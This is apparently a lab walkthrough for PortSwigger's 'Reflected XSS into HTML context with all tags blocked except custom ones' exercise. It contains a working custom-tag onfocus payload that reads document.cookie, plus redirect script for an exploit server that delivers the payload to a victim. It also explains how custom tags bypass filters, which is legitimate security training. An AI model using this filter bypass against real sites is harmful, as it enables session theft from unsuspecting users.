# XSS - Reflected XSS into HTML context with all tags blocked except custom ones

## 📌 Lab Details
- **Title**: Reflected XSS into HTML context with all tags blocked except custom ones
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/35d25a422af775cc93101fff0b686ae37e3ccb4844d3272061e090aa0c854ced?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-html-context-with-all-standard-tags-blocked

## 🔍 Summary
Custom HTML tags (like `<xss>`, `<abc>`) are non-standard elements that browsers still accept. In XSS labs, attackers use them to **bypass filters or firewalls** that block standard tags like `<script>` or `<img>`.

## 🛠 Steps to Solve
1. Creating a custom **tag** with `onfocus` : `<xss id=x onfocus=alert(document.cookie) tabindex=1>`.
2. Injecting the payload into the exploit server: `<script>
location = 'https://0a1c00ea04059a5c8197de1d00c30000.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>`.
3. Store the **exploit** and deliver it to the victim.
   
## 📖 Key Takeaways
- **Custom tags** in HTML are valid and don't throw errors.
- They are not blocked by many web application firewalls.
- You can **attach event handlers** (like `onfocus`,`onclick` etc.) to them.
  
## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/004274b7-cb7c-416a-805f-6134d8711674)
![image](https://github.com/user-attachments/assets/8502141e-0308-4b03-9dd8-436edc94da29)
